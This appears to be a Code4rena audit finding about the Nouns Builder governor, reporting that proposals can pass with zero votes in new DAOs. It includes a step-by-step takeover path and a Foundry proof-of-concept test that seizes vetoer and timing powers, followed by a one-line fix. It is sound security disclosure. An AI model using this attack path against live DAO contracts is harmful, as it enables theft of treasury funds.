## Tags

- bug
- 2 (Med Risk)
- sponsor confirmed

# [A proposal can pass with 0 votes in favor at early DAO stages](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/436) 

# Lines of code

https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L441


# Vulnerability details

It's possible to create a proposal for a DAO as soon as it's deployed and the proposal can pass even if nobody votes.

This possibility of doing so is based on the following assumptions:
1. The vetoer doesn't veto the proposal
2. `proposal.quorumVotes` is 0, which happens when `token.totalSupply() * settings.quorumThresholdBps < 10_000`
3. `proposal.proposalThreshold` is 0, which happens when `token.totalSupply() * settings.proposalThresholdBps < 10_000`

The amount of time necessary to create and execute a proposal of this kind is dictated by `governor.settings.votingDelay + governor.settings.votingDelay + treasury.delay()`, the lower the time the higher the risk.

## Impact
A malicious actor could build an off-chain script that tracks `DAODeployed` events on the `Manager.sol` contract. Every time a new DAO is spawned the script submits a proposal. This attack is based on the fact that such at an early stage nobody might notice and the chances of this happening are made real because every new DAO can be targeted.


A potential proposal created by an attacker might look like this:
1. Call `governor.updateVetoer(attacker)`
1. Call `governor.updateVotingDelay(0)`
2. Call `governor.updateVotingPeriod(0)`
3. Call `treasury.updateGracePeriod(0)`
4. Call `treasury.updateDelay(1 day)`

With this setup the attacker can make a proposal and queue it immediately to then execute it after 1 day time; which gives him the time to veto any proposal that tries to interfere with the attack. At this point the attacker has sudo powers and if there's any bid he can take the funds.

This is just one possible attack path, but the point is making a proposal pass can give an attacker sudo powers and nobody might notice for a while.

## Proof of Concept
Here's a test I wrote that proves the attack path outlined above, you can copy it into `Gov.t.sol` and execute it with `forge test -m test_sneakProposalAttack`:

```javascript
 function test_sneakProposalAttack() public {
        address attacker = vm.addr(0x55);

        address[] memory targets = new address[](5);
        uint256[] memory values = new uint256[](5);
        bytes[] memory calldatas = new bytes[](5);

        // 1. Call `governor.updateVetoer(attacker)`
        targets[0] = address(governor);
        values[0] = 0;
        calldatas[0] = abi.encodeWithSignature("updateVetoer(address)", attacker);

        // 2. Call `governor.updateVotingDelay(0)`
        targets[1] = address(governor);
        values[1] = 0;
        calldatas[1] = abi.encodeWithSignature("updateVotingDelay(uint256)", 0);

        //3. Call `governor.updateVotingPeriod(0)`
        targets[2] = address(governor);
        values[2] = 0;
        calldatas[2] = abi.encodeWithSignature("updateVotingPeriod(uint256)", 0);

        //3. Call `treasury.updateGracePeriod(0)`
        targets[3] = address(treasury);
        values[3] = 0;
        calldatas[3] = abi.encodeWithSignature("updateGracePeriod(uint256)", 0);

        //4. Call `treasury.updateDelay(1 day)`
        targets[4] = address(treasury);
        values[4] = 0;
        calldatas[4] = abi.encodeWithSignature("updateDelay(uint256)", 60 * 60 * 24);

        //Attacker creates proposal as soon as contract is deployed
        bytes32 proposalId = governor.propose(targets, values, calldatas, "");

        //Wait for proposal.voteEnd
        vm.warp((governor.getProposal(proposalId).voteEnd));

        //Queue it
        governor.queue(proposalId);

        //Wait for treasury delay
        vm.warp(block.timestamp + treasury.delay());

        //Execute proposal
        governor.execute(targets, values, calldatas, keccak256(bytes("")));

        //Shows it's now possible for an attacker to queue a proposal immediately
        bytes32 proposalId2 = governor.propose(targets, values, calldatas, "mock");
        governor.queue(proposalId2);

        //And executed it after one day
        vm.warp(block.timestamp + 60 * 60 * 24);
        governor.execute(targets, values, calldatas, keccak256(bytes("mock")));
    }

```

## Recommended Mitigation Steps
This potential attack path comes from a combination of factors, maninly:
1. A proposal can be created directly after deployment
2. The `proposal.proposal.proposalThreshold` and `proposal.quorumVotes` are set to 0 at such early stages
3. A proposal with 0 votes is allowed to pass

I would say that requiring at least 1 vote for a proposal to be considered `Succeeded` is rational and should mitigate this problem because that would require the attacker to bid on auction to get 1 voting power, increasing the cost and the time necessary for the attack.

At [Governor.sol#L441](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L441) we have:

```javscript
else if (proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {
        return ProposalState.Defeated;
}
```
which can be changed to:
```javscript
else if (proposal.forVotes == 0 || proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {
        return ProposalState.Defeated;
}
```
